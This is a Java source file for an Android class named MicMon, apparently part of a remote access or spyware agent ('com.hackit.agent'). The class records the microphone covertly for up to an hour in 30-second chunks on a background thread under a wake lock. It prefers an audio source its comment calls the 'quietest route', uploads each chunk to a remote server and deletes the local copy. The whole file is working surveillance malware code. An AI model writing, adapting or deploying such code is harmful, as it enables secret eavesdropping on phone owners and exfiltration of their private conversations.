package com.hackit.agent;

import android.content.Context;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.PowerManager;

import java.io.File;

/**
 * Continuous microphone. Records fixed 30-second AAC chunks on a background
 * thread and uploads each one as it closes, so a long session never needs a
 * single giant file in memory. {@code VOICE_COMMUNICATION} is tried first
 * because it is the quietest route on most vendor builds; plain MIC is the
 * fallback. Stops on its own if the permission is revoked mid-run.
 */
final class MicMon {
    private static final int CHUNK_SECONDS = 30;
    private static final int MAX_TOTAL_SECONDS = 3600;
    private static volatile boolean running;
    private static volatile int chunks;
    private static Thread worker;

    static boolean running() {
        return running;
    }

    static synchronized String start(final Context ctx) {
        if (running) {
            return "already recording";
        }
        if (!Common.granted(ctx, android.Manifest.permission.RECORD_AUDIO)) {
            return "RECORD_AUDIO not granted";
        }
        running = true;
        chunks = 0;
        final Context app = ctx.getApplicationContext();
        worker = new Thread(new Runnable() {
            @Override
            public void run() {
                PowerManager power = (PowerManager) app.getSystemService(Context.POWER_SERVICE);
                PowerManager.WakeLock lock = null;
                try {
                    if (power != null) {
                        lock = power.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "hackit:mic");
                        lock.acquire(MAX_TOTAL_SECONDS * 1000L);
                    }
                } catch (Throwable ignored) {
                }
                long until = System.currentTimeMillis() + MAX_TOTAL_SECONDS * 1000L;
                while (running && System.currentTimeMillis() < until) {
                    if (!Common.granted(app, android.Manifest.permission.RECORD_AUDIO)) {
                        break;
                    }
                    String verdict = chunk(app);
                    if (verdict == null) {
                        // Recorder unavailable (call in progress, mic busy).
                        sleep(2000);
                        continue;
                    }
                    if (verdict.isEmpty()) {
                        sleep(400);
                    }
                }
                if (lock != null && lock.isHeld()) {
                    try {
                        lock.release();
                    } catch (Throwable ignored) {
                    }
                }
                running = false;
            }
        }, "mic-stream");
        worker.setDaemon(true);
        worker.start();
        return "recording 30s chunks";
    }

    static synchronized String stop() {
        if (!running) {
            return "not recording";
        }
        running = false;
        if (worker != null) {
            worker.interrupt();
            worker = null;
        }
        return "stopped after " + chunks + " chunks";
    }

    private static void sleep(long ms) {
        try {
            Thread.sleep(ms);
        } catch (InterruptedException exc) {
            Thread.currentThread().interrupt();
        }
    }

    /** One chunk. Returns null when no recorder could start. */
    private static String chunk(Context app) {
        File file = new File(app.getCacheDir(), "mic-" + System.currentTimeMillis() + ".m4a");
        MediaRecorder recorder = Build.VERSION.SDK_INT >= 31
                ? new MediaRecorder(app) : new MediaRecorder();
        try {
            int source = MediaRecorder.AudioSource.MIC;
            if (Build.VERSION.SDK_INT >= 24) {
                try {
                    recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
                    source = MediaRecorder.AudioSource.VOICE_COMMUNICATION;
                } catch (Throwable exc) {
                    recorder = Build.VERSION.SDK_INT >= 31
                            ? new MediaRecorder(app) : new MediaRecorder();
                }
            }
            recorder.setAudioSource(source);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setAudioChannels(1);
            recorder.setAudioSamplingRate(44100);
            recorder.setAudioEncodingBitRate(64000);
            recorder.setOutputFile(file.getAbsolutePath());
            recorder.prepare();
            recorder.start();
            long end = System.currentTimeMillis() + CHUNK_SECONDS * 1000L;
            while (running && System.currentTimeMillis() < end) {
                sleep(500);
            }
            try {
                recorder.stop();
            } catch (Throwable exc) {
                //noinspection ResultOfMethodCallIgnored
                file.delete();
                return "";
            }
            if (file.isFile() && file.length() > 1024) {
                boolean sent = Net.upload(app, file, file.getName(), "mic");
                if (sent) {
                    chunks += 1;
                    Outbox.event("mic", "chunk " + chunks + " (" + file.length() + " bytes)");
                }
            }
            return "";
        } catch (Throwable exc) {
            Log.d("mic chunk: " + exc);
            //noinspection ResultOfMethodCallIgnored
            file.delete();
            return null;
        } finally {
            try {
                recorder.release();
            } catch (Throwable ignored) {
            }
            //noinspection ResultOfMethodCallIgnored
            file.delete();
        }
    }

    private MicMon() {
    }
}
